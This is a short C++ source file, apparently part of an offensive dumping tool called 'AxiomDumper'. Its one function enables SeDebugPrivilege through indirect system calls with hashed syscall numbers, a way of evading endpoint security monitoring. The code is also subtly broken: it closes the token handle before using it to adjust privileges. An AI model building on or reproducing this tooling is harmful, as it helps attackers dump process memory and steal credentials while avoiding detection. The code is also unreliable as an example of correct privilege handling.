#include "AxiomDumper.h"
#include "SSN.h"
#include "SSN_Hashes.h"

// https://learn.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
// Obtain SeDebugPrivilege
BOOL AXIOM_PrivIncrease(LUID luid)
{
	TOKEN_PRIVILEGES tPriv;
	NTSTATUS status;
	HANDLE hToken = nullptr;

	IndirectSyscall(
		status,
		AXIOM_SSN_NtOpenProcessToken,
		NtCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES,
		&hToken
	);
	if (!NT_SUCCESS(status))
	{
		if (status == 0xC0000022)
			return (false);
	}

	IndirectSyscall(status, AXIOM_SSN_NtClose, hToken);

	tPriv.PrivilegeCount = 1;
	tPriv.Privileges[0].Luid = luid;
	tPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	IndirectSyscall(
		status,
		AXIOM_SSN_NtAdjustPrivilegesToken,
		hToken,
		FALSE,
		&tPriv,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL
	);
	return (NT_SUCCESS(status));
}
